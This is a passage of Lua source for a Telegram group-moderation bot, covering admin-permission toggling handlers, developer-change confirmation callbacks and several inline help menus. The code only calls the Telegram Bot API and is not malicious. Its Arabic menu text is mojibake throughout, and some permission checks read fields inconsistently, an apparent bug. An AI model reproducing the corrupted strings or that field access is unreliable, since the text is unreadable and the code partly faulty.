promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=false' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=false' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinkfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinkfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=false'  ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end



if Text and Text:match('(.*)/noS') then
sudoo = Text:gsub("/noS","")
print(msg.sender_user_id_,sudoo)
print(msg.sender_user_id_== tonumber(sudoo))
if msg.sender_user_id_ == tonumber(sudoo) then 
--DeleteMessage(msg.chat_id_,{[0] = msg.message_id_})
local Teext = "π§ βΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± Ψ¨ΩΨ¬Ψ§Ψ­ ."
database:del(bot_id..":usernewsudo:"..msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
return false
end
end

if Text and Text:match('(.*)/yesS') then
sudoo = Text:gsub("/yesS","")
if msg.sender_user_id_ == tonumber(sudoo) then 
local Texxt = "π§ βΏ Ψ­Ψ³ΩΩΨ§ Ψ§ΩΨ§Ω ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω ΩΨΉΨ±Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ§ΩΨ¬Ψ―ΩΨ― ..."
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'Ψ₯Ψ§ΩΩΨΊΩΨ§Ψ‘ Ψ§ΩΨ£ΩΩΨ±', callback_data=msg.sender_user_id_.."/noS"}}}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Texxt).."&message_id="..msg_idd.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:set(bot_id..":usernewsudo:"..msg.sender_user_id_,data.message_id_)
return false
end
end

if Text and Text:match('(.*)/help1') and Addictive(tahaj) then
if tonumber(Text:match('(.*)/help1')) == tonumber(data.sender_user_id_) then
local Teext =[[
π βΏ Ψ§ΩΨ§ΩΨ± Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βΊβΏΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω 
βΊβΏΩΩΩ/ΩΨͺΨ­ + Ψ§ΩΨ§ΩΨ± Ψ¨Ψ§ΩΨͺΩΩΨ― β’ Ψ¨Ψ§ΩΨ·Ψ±Ψ― β’ Ψ¨Ψ§ΩΩΨͺΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΨ§ΩΨ±ΩΨ§Ψ¨Ψ·
πβΏΨ§ΩΩΨΉΨ±Ω
πβΏΨ§ΩΨͺΨ§Ω
πβΏΨ§ΩΨ΄Ψ§Ψ±Ψ­Ω
πβΏΨ§ΩΨͺΨΉΨ―ΩΩ
πβΏΨ§ΩΨͺΨ«Ψ¨ΩΨͺ
πβΏΨ§ΩΩΨͺΨ­Ψ±ΩΩ
πβΏΨ§ΩΩΩΩΨ§Ψͺ
πβΏΨ§ΩΨ΅ΩΨ±
πβΏΨ§ΩΩΩΨ΅ΩΨ§Ψͺ
πβΏΨ§ΩΩΩΨ―ΩΩ
πβΏΨ§ΩΨ§ΩΩΨ§ΩΩ
πβΏΨ§ΩΨ―Ψ±Ψ―Ψ΄Ω
πβΏΨ§ΩΨͺΩΨ¬ΩΩ
πβΏΨ§ΩΨ§ΨΊΨ§ΩΩ
πβΏΨ§ΩΨ΅ΩΨͺ
πβΏΨ§ΩΨ¬ΩΨ§Ψͺ
πβΏΨ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ
πβΏΨ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ
πβΏΨ§ΩΨ¨ΩΨͺΨ§Ψͺ
πβΏΨ§ΩΨͺΩΨ±Ψ§Ψ±
πβΏΨ§ΩΩΩΨ§ΩΨ΄
πβΏΨ§ΩΨ³ΩΩΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κ Β» [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=data.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help2') and Addictive(tahaj) then
if tonumber(Text:match('(.*)/help2')) == tonumber(data.sender_user_id_) then
local Teext =[[
π₯βΏΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βΆοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΩΨ²
π βΏΨͺΨ§Ω ΩΩΩΩ
π βΏΨΉΨ―Ψ― Ψ§ΩΨ¬Ψ±ΩΨ¨
π«βΏΩΨͺΩ
π·βΏΨ­ΨΈΨ±
π·βΏΨ·Ψ±Ψ―
π«βΏΩΩΨΉ
π«βΏΨͺΩΩΨ―
βΊβΏΨ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ
πβΏΨ§ΩΩΨ­ΨΈΩΨ±ΩΩ
πβΏΨ§ΩΩΩΨͺΩΩΩΩ
πβΏΨ§ΩΩΩΩΨ²ΩΩ
??βΏΨ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
πβΏΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
πβΏΨͺΨ«Ψ¨ΩΨͺ
βΊβΏΨ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ
πβΏΨ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ
π³βΏΨ§ΩΨ±Ψ§Ψ¨Ψ·
πβΏΨ§ΩΩΩΨ§ΩΩΩ
ππ»βΏΨ§ΩΨͺΨ±Ψ­ΩΨ¨
ππ»βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
β οΈβΏΨ§ΨΆΩ /ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ 
β οΈβΏΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± + Ψ§ΩΨΉΨ―Ψ―
π­βΏΨ§ΩΨ―Ω
π­βΏΨ¬ΩΨ§ΨͺΩ
π­βΏΨ³Ψ­ΩΨ§ΨͺΩ
π­βΏΨ±Ψ³Ψ§Ψ¦ΩΩ
π­βΏΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΩΨΆΨΉ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
π¨βΏΨ§Ψ³Ω
π¨βΏΨ±Ψ§Ψ¨Ψ·
π¨βΏΨ΅ΩΨ±Ω
π¨βΏΩΨ΅Ω
π¨βΏΩΩΨ§ΩΩΩ
π¨βΏΨͺΨ±Ψ­ΩΨ¨
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΩΨ³Ψ­ + Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΨ§Ω
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
π βΏΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
π βΏΨ§ΩΩΨ­ΨΈΩΨ±ΩΩ
π βΏΨ§ΩΩΩΩΨ²ΩΩ
π βΏΨ§ΩΩΩΨͺΩΩΩΩ
π βΏΨ§ΩΩΨ·Ψ±ΩΨ―ΩΩ
π βΏΨ§ΩΩΩΨ§ΩΩΩ
π βΏΨ§ΩΨ¨ΩΨͺΨ§Ψͺ
π βΏΨ§ΩΨ΅ΩΨ±Ω
π βΏΨ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
π βΏΨ§ΩΨ±Ψ§Ψ¨Ψ·
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=data.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help3') and Owner(tahaj) then
if tonumber(Text:match('(.*)/help3')) == tonumber(data.sender_user_id_) then
local Teext =[[
π₯βΏ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ
βοΈβΏΨ±ΩΨΉ/ΩΨ΄Ω Ψ§ΩΩΩΩΨ―
βοΈβΏΨͺΩΨ²ΩΩ Ψ§ΩΩΩ

π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΉΨ¨Ω/Ψ§ΩΨ§ΩΨΉΨ§Ψ¨
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΨ·Ψ±Ψ―
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·
π§βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄
β¨οΈβΏΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω
πβΏΨ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ
πβΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ―
πβΏΨ§ΩΨ§Ψ―ΩΩΩΩ
πβΏΨ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
πβΏΨͺΩΨΈΩΩ + ΨΉΨ―Ψ―
πβΏΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ
πβΏΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβΏΩΨͺΨΊΩΨ± Ψ±Ψ―ΩΨ― Ψ§ΩΨ§ΩΨ―Ω :- 
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² + Ψ§ΩΩΨ΅
ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ + Ψ§ΩΩΨ΅
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=data.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help4') and Constructor(tahaj) then
if tonumber(Text:match('(.*)/help4')) == tonumber(data.sender_user_id_) then
local Teext =[[
πβΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦
βοΈβΏΨ§ΩΩΩΨ΄Ψ¦ΩΩ
πβΏΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ

πβΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±
βοΈβΏΨ§ΩΩΨ―Ψ±Ψ§Ψ‘
πβΏΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
πβΏΨͺΨΉΩΩ/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω
π―βΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ§ΩΨ±
π―βΏΨ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
π―βΏΨ­Ψ°Ω/ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
π―βΏΨ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
π―βΏΨ§ΨΆΩ ΩΨ¬ΩΩΨ±Ψ§Ψͺ + Ψ§ΩΨΉΨ―Ψ― Ψ¨Ψ§ΩΨ±Ψ―
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=data.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help5') and DevBot(tahaj) then
if tonumber(Text:match('(.*)/help5')) == tonumber(data.sender_user_id_) then
local Teext =[[
πβπ¨βΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω  
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
βοΈβΏΨ­ΨΈΨ± ΨΉΨ§Ω
βοΈβΏΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω
πβΏΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω
π§βΏΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ
π βΏΨ§ΨΆΩ /Ψ­Ψ°Ω ΩΨ·ΩΨ± 
πβπ¨βΏΨ§ΩΩΨ·ΩΨ±ΩΩ
πβΏΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ
πβΏΨ§ΨΆΩ/Ψ­Ψ°Ω Ψ±Ψ― ΨΉΨ§Ω 
πβΏΩΨ³Ψ­ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±
πβΏΨ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ± 
πβΏΩΨΆΨΉ /Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ± 
βοΈβΏΨͺΨ­Ψ―ΩΨ«  + ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ 
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ 
π βΏ ΨͺΨΉΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ + Ψ§ΩΨΉΨ―Ψ―
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ψ©
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ 
π βΏΨͺΩΨΉΩΩ/ΨͺΨΉΨ·ΩΩ ΩΩΩ + Ψ§Ψ³Ω Ψ§ΩΩΩΩ
πβΏΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± 
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
πβπ¨βΏΨͺΩΨΉΩΩ /ΨͺΨΉΨ·ΩΩ

βοΈβΏΨ±ΩΨΉ/ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω
βοΈβΏΨ±ΩΨΉ ΩΩΨ΄Ψ¦ 
πβΏΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ
πβΏΨ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ 
π―βΏΨΊΨ§Ψ―Ψ± 
π―βΏΨΊΨ§Ψ―Ψ± + Ψ§ΩΨ§ΩΨ―Ω
π―βΏΨ§Ψ°Ψ§ΨΉΩ 
π―βΏΨ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ
π―βΏΨ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ 
π―βΏΨ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ 
π―βΏΨ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ 
Β«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β»
α΄Κα΄Ι΄α΄Κ β³ [ sα΄α΄Κα΄α΄ α΄Κ?α΄](https://t.me/AKJA0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ', callback_data=data.sender_user_id_.."/help1"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§Ψ―ΩΩΩΩ', callback_data=data.sender_user_id_.."/help2"},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ·ΩΨ± ', callback_data=data.sender_user_id_.."/help5"},
},
{
{text = 'π Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨ±Ψ¦ΩΨ³ΩΩ π', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help') and Addictive(tahaj) then
if tonumber(Text:match('(.*)/help')) == tonumber(data.sender_user_id_) then
local Teext =[[
ΩΨ±Ψ­Ψ¨Ψ§ Ψ¨Ω ΨΉΨ²ΩΩΨ²Ω ΩΩ Ψ§ΩΨ§ΩΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩΩ.π¦
Ωβ’ββββββββββββββββββββ’Ω
π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘           π£ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ­ΩΨ§ΩΩ
